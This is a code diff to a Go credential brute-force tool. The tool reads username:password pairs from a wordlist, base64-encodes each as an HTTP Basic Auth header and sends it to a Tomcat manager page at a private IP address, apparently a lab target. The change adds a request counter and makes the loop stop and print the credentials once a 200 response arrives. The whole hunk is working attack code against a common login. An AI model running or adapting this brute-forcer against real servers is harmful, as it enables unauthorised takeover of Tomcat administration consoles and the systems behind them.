@@ -38,17 +38,22 @@ func main() {
 	// Create a scanner to read the file line by line
 	scanner := bufio.NewScanner(file)
 
-	fmt.Println("Starting Brute Force")
+	fmt.Println("Starting Brute Force...\n")
 
 	// Read each line in the file
+	reqCount := 0
 	for scanner.Scan() {
-		pt_basicAuth := scanner.Text()
-		fmt.Println(pt_basicAuth)
-		strBytes := []byte(pt_basicAuth)
+		ptBasicAuth := scanner.Text()
+		strBytes := []byte(ptBasicAuth)
 
-		basicAuth := base64.StdEncoding.EncodeToString(strBytes)
-		status_code := makeRequest("http://10.129.136.9:8080/manager/html", basicAuth)
-		fmt.Println(status_code)
+		b64BasicAuth := base64.StdEncoding.EncodeToString(strBytes)
+		reqCount += 1
+		fmt.Printf("\rSending Request: %d", reqCount)		
+		statusCode := makeRequest("http://10.129.136.9:8080/manager/html", b64BasicAuth)
+		if statusCode == 200{
+			fmt.Println("\n\nCredentials Found:", ptBasicAuth)
+			break
+		}
 	}
 
 	// Check for any errors that occurred while scanning the file
